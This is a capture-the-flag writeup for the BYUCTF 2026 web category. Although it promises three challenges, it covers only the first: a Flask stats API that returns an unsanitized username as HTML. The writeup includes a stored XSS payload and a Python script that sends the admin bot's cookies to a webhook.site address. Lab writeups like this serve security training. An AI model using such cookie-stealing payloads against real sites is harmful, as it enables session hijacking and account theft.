---
title: "BYUCTF 2026 — Web Category Writeup"
date: 2026-05-01
tags: [web, xss, ssrf, desync, byuctf]
ctf: "BYUCTF 2026"
summary: "Full walkthrough of the BYUCTF 2026 web category — three chained challenges covering XSS via admin bot, SSRF exploitation, and HTTP request smuggling."
draft: false
---

> **Archive Notice:** These challenges are from the completed BYU CTF competition (also known as BYUCTF). They are no longer live, but studying them is one of the best ways to level up your web exploitation skills. Each challenge sits in the Web category and represents a different class of vulnerability. Together they form a beautiful progression from intermediate to advanced attack chaining.

---

# Introduction

CTF competitions are laboratories. They give you a safe, legal, and controlled environment where you can practice the same skills that real penetration testers and security researchers use every day. BYUCTF is organized by Brigham Young University and is known for producing high-quality web challenges that teach real-world exploitation techniques rather than trivial puzzles.

None of these challenges is solvable by poking around with Burp Suite and hoping for the best. Each one requires you to deeply read source code, understand how individual components interact, and chain findings together deliberately. That is what makes them exceptional teaching material.
Let us dive in.


# Challenge One: Not A Problem

---

## The Setup

You are given two URLs:

- The main challenge server (a Flask application)
- An admin bot service you can submit URLs to

You also receive the full source code for both. This is generous — in real penetration testing you rarely get source code — but the BYU CTF team wants you to focus on understanding the vulnerabilities rather than spending hours on reconnaissance.

The moment you see "admin bot," one word should light up in your mind: **XSS**. Admin bots exist in CTF challenges for exactly one reason — they are the privileged victim whose session you need to abuse. Keep that in the back of your head as we analyze the code.

## Reading the Server Code: server.py

Let us go through every route carefully.

### The Root Route

```python
@app.route('/', methods=['GET'])
def main():
    return 'Bro did you really think I care about the front end enough to make one?'
```

Nothing interesting here. The developer has strong opinions about front end work. Moving on.

### The Stats Storage Route

```python
@app.route('/api/stats', methods=['POST'])
def add_stats():
    try:
        username = request.json['username']
        high_score = int(request.json['high_score'])
    except:
        return '{"error": "Invalid request"}'
    
    id = str(uuid.uuid4())

    stats.append({
        'id': id,
        'data': [username, high_score]
    })
    return '{"success": "Added", "id": "'+id+'"}'
```

This route accepts a JSON body with a `username` field and a `high score` field. It stores them in an in-memory list and returns a randomly generated UUID as an identifier. Nothing is sanitized. Nothing is validated beyond converting `high score` to an integer. The `username` is stored raw, exactly as provided.

**Mental note: the username goes in unsanitized.**

### The Stats Retrieval Route

```python
@app.route('/api/stats/<string:id>', methods=['GET'])
def get_stats(id):
    for stat in stats:
        if stat['id'] == id:
            return str(stat['data'])
        
    return '{"error": "Not found"}'
```

This route retrieves a stat by its UUID and returns it as a string representation of a Python list. The response uses `str()` on a Python list, which produces something like `["<script>alert(1)</script>", 42]`. The response `Content-Type` is whatever Flask defaults to — `text/html` — which means the browser will render this as HTML.

**This is our XSS sink. The username (controlled by us) ends up inside an HTML response.**

## Exploitation Chain

1. POST to `/api/stats` with `username: "<script>fetch('https://webhook.site/xxx?c='+document.cookie)</script>"`
2. Save the returned UUID
3. Submit `http://challenge-server/api/stats/<uuid>` to the admin bot
4. The admin bot visits the URL, the browser renders the HTML response, our script executes, and the admin's cookie is sent to our webhook

```python
import requests

CHALLENGE = "http://challenge-server"
WEBHOOK = "https://webhook.site/your-id"

# Step 1: Store XSS payload
r = requests.post(f"{CHALLENGE}/api/stats", json={
    "username": f"<script>fetch('{WEBHOOK}?c='+document.cookie)</script>",
    "high_score": 1
})
uid = r.json()["id"]

# Step 2: Submit to bot
requests.post("http://admin-bot/visit", json={"url": f"{CHALLENGE}/api/stats/{uid}"})
```

## Lessons Learned

- When you see "admin bot," think XSS first
- `str()` on a Python list containing user input produces an XSS sink if the Content-Type is text/html
- Always check what `Content-Type` the server returns — it determines how the browser interprets the body
